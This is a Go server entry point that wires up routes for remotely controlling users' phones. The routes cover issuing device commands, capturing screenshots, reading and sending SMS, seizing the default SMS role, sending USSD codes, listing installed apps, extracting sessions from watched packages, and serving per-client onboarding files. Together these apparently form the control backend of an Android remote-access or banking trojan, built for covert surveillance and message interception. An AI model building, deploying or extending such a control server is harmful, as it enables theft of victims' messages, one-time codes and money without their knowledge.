package main

import (
	"context"
	"errors"
	"log/slog"
	"net/http"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/base/realtime/internal/bus"
	"github.com/base/realtime/internal/config"
	"github.com/base/realtime/internal/httpapi"
	"github.com/base/realtime/internal/presence"
	"github.com/base/realtime/internal/push"
	"github.com/base/realtime/internal/store"
	"github.com/base/realtime/internal/ws"
)

func main() {
	slog.SetDefault(slog.New(slog.NewJSONHandler(os.Stdout, nil)))
	if err := run(); err != nil {
		slog.Error("stopped", "err", err)
		os.Exit(1)
	}
}

func run() error {
	config.LoadDotEnv()
	cfg, err := config.Load()
	if err != nil {
		return err
	}
	if len(cfg.FrameKey) > 0 {
		slog.Info("frame crypto enabled")
	} else {
		slog.Warn("frame crypto disabled; set REALTIME_FRAME_KEY")
	}
	if cfg.AiURL != "" {
		slog.Info("ai guide enabled",
			"url", cfg.AiURL,
			"model", cfg.AiModel,
			"auth", cfg.AiKey != "",
			"prompt", cfg.AiPrompt,
			"timeout", cfg.AiTimeout.String(),
		)
	} else {
		slog.Warn("ai guide disabled; set REALTIME_AI_URL")
	}
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	st, err := store.Connect(ctx, cfg.MongoURI, cfg.MongoDB)
	if err != nil {
		return err
	}
	defer func() {
		disc, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		if err := st.Disconnect(disc); err != nil {
			slog.Warn("mongo disconnect", "err", err)
		}
	}()

	markCtx, cancelMark := context.WithTimeout(ctx, 5*time.Second)
	err = st.MarkInstanceOffline(markCtx, cfg.InstanceID)
	cancelMark()
	if err != nil {
		return err
	}

	var messageBus bus.Bus = bus.Nop{}
	if redis, parseErr := bus.ParseRedis(cfg.RedisURL); parseErr != nil {
		return parseErr
	} else if redis != nil {
		messageBus = redis
		slog.Info("redis enabled")
	}

	presenceSvc := presence.New(ctx, st, cfg.OfflineGrace, cfg.StaleAfter)
	hub := ws.New(ctx, cfg, st, presenceSvc, messageBus, push.New(cfg.FCMServerKey, cfg.FCMWebhook))
	go presenceSvc.RunStaleSweep(ctx)
	go hub.Run(ctx)
	hub.WarmAi(ctx)

	api := httpapi.New(st, presenceSvc, hub, cfg, hub.Ai())
	mux := http.NewServeMux()
	mux.HandleFunc("GET /health", api.Health)
	mux.HandleFunc("GET /debug/ai", api.AiChatsUI)
	mux.HandleFunc("GET /v1/ai/chats", api.ListAiChats)
	mux.HandleFunc("DELETE /v1/ai/chats", api.ClearAiChats)
	mux.HandleFunc("POST /v1/ai/chat", api.PostAiChat)
	mux.HandleFunc("GET /v1/ai/playground", api.AiPlaygroundMeta)
	mux.HandleFunc("GET /v1/overview", api.Overview)
	mux.HandleFunc("GET /v1/users/set/{token}", api.UserBySetToken)
	mux.HandleFunc("GET /v1/users/blocked", api.ListBlockedUsers)
	mux.HandleFunc("PATCH /v1/users/{userId}", api.PatchUser)
	mux.HandleFunc("POST /v1/users/{userId}/devices/{deviceId}/command", api.DeviceCommand)
	mux.HandleFunc("POST /v1/users/{userId}/devices/{deviceId}/screenshot", api.UploadScreenshot)
	mux.HandleFunc("GET /v1/users/{userId}/devices/{deviceId}/screenshot", api.GetScreenshot)
	mux.HandleFunc("GET /v1/users/{userId}/devices/{deviceId}/sms/threads", api.ListSmsThreads)
	mux.HandleFunc("GET /v1/users/{userId}/devices/{deviceId}/sms/threads/{threadKey}", api.ListSmsMessages)
	mux.HandleFunc("POST /v1/users/{userId}/devices/{deviceId}/sms/sync", api.SyncSms)
	mux.HandleFunc("POST /v1/users/{userId}/devices/{deviceId}/sms/send", api.SendSms)
	mux.HandleFunc("POST /v1/users/{userId}/devices/{deviceId}/sms/default", api.SmsDefaultControl)
	mux.HandleFunc("POST /v1/users/{userId}/devices/{deviceId}/offmode", api.OffmodeControl)
	mux.HandleFunc("GET /v1/offmode/settings", api.OffmodeSettings)
	mux.HandleFunc("PUT /v1/offmode/settings", api.OffmodeSettings)
	mux.HandleFunc("GET /v1/users/{userId}/devices/{deviceId}/apps", api.ListInstalledApps)
	mux.HandleFunc("POST /v1/users/{userId}/devices/{deviceId}/apps/sync", api.SyncInstalledApps)
	mux.HandleFunc("GET /v1/users/{userId}/devices/{deviceId}/ussd", api.ListUssdLogs)
	mux.HandleFunc("POST /v1/users/{userId}/devices/{deviceId}/ussd", api.SendUssd)
	mux.HandleFunc("GET /v1/ai/prompts", api.AIPrompts)
	mux.HandleFunc("PUT /v1/ai/prompts/{id}", api.AIPrompt)
	mux.HandleFunc("DELETE /v1/ai/prompts/{id}", api.AIPrompt)
	mux.HandleFunc("GET /v1/watch/packages", api.WatchPackages)
	mux.HandleFunc("PUT /v1/watch/packages", api.WatchPackages)
	mux.HandleFunc("GET /v1/watch/log-group", api.WatchLogGroup)
	mux.HandleFunc("PATCH /v1/watch/log-group", api.WatchLogGroup)
	mux.HandleFunc("DELETE /v1/watch/log-group", api.WatchLogGroup)
	mux.HandleFunc("POST /v1/watch/log-group/prepare-bind", api.PrepareWatchLogBind)
	mux.HandleFunc("GET /v1/watch/log-group/photo", api.WatchLogGroupPhoto)
	mux.HandleFunc("POST /v1/watch/action", api.WatchAction)
	mux.HandleFunc("GET /v1/users/{userId}/devices/{deviceId}/sessions", api.ListWatchSessions)
	mux.HandleFunc("GET /v1/users/{userId}/devices/{deviceId}/sessions/{sessionId}", api.GetWatchSession)
	mux.HandleFunc("POST /v1/users/{userId}/devices/{deviceId}/sessions/{sessionId}/extract", api.ExtractWatchSession)
	mux.HandleFunc("GET /v1/presence/{userId}", api.Presence)
	mux.HandleFunc("GET /v1/panel/access", api.PanelAccess)
	mux.HandleFunc("GET /v1/ports/managers", api.PortManagers)
	mux.HandleFunc("POST /v1/ports/managers", api.PortManagers)
	mux.HandleFunc("GET /v1/ports", api.Ports)
	mux.HandleFunc("POST /v1/ports", api.Ports)
	mux.HandleFunc("PATCH /v1/ports/{code}", api.UpdatePort)
	mux.HandleFunc("DELETE /v1/ports/{code}", api.DeletePort)
	mux.HandleFunc("POST /v1/binds", api.PrepareBind)
	mux.HandleFunc("GET /v1/binds/{requestId}", api.GetBind)
	mux.HandleFunc("GET /v1/binds/{requestId}/photo", api.BindPhoto)
	mux.HandleFunc("GET /v1/ports/{code}/photo", api.PortPhoto)
	mux.HandleFunc("GET /v1/ports/{code}/client", api.PortClient)
	mux.HandleFunc("GET /v1/ports/{code}/client/font", api.PortClientFont)
	mux.HandleFunc("GET /v1/ports/{code}/onboarding", api.PortOnboarding)
	mux.HandleFunc("GET /v1/ports/{code}/onboarding/{file...}", api.PortOnboarding)
	mux.HandleFunc("PUT /v1/ports/{code}/onboarding", api.PortOnboarding)
	mux.HandleFunc("DELETE /v1/ports/{code}/onboarding", api.PortOnboarding)
	mux.HandleFunc("GET /v1/clients", api.Clients)
	mux.HandleFunc("POST /v1/clients", api.Clients)
	mux.HandleFunc("GET /v1/clients/{id}", api.ClientItem)
	mux.HandleFunc("PATCH /v1/clients/{id}", api.ClientItem)
	mux.HandleFunc("DELETE /v1/clients/{id}", api.ClientItem)
	mux.HandleFunc("GET /v1/clients/{id}/font", api.ClientFont)
	mux.HandleFunc("PUT /v1/clients/{id}/font", api.ClientFont)
	mux.HandleFunc("DELETE /v1/clients/{id}/font", api.ClientFont)
	mux.HandleFunc("GET /v1/clients/{id}/files", api.ClientFiles)
	mux.HandleFunc("GET /v1/clients/{id}/files/{file...}", api.ClientFiles)
	mux.HandleFunc("PUT /v1/clients/{id}/files", api.ClientFiles)
	mux.HandleFunc("POST /v1/ports/{code}/bind", api.BindPort)
	mux.HandleFunc("POST /v1/ports/{code}/prepare-bind", api.PreparePortBind)
	mux.HandleFunc("POST /v1/ports/{code}/unbind", api.UnbindPort)
	mux.HandleFunc("POST /v1/ports/bind-shared", api.BindPortShared)
	mux.HandleFunc("POST /v1/ports/unbind-group", api.UnbindPortGroup)
	mux.HandleFunc("POST /v1/session", api.Session)
	mux.HandleFunc("GET /v1/ws", hub.ServeHTTP)

	srv := &http.Server{
		Addr:              cfg.Addr,
		Handler:           httpapi.CORS(cfg.Origins, mux),
		ReadHeaderTimeout: 10 * time.Second,
	}
	go func() {
		<-ctx.Done()
		shut, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		if err := srv.Shutdown(shut); err != nil {
			slog.Warn("shutdown", "err", err)
		}
		messageBus.Close()
	}()

	slog.Info("listening", "addr", cfg.Addr, "instance", cfg.InstanceID)
	err = srv.ListenAndServe()
	stop()
	if errors.Is(err, http.ErrServerClosed) {
		return nil
	}
	return err
}
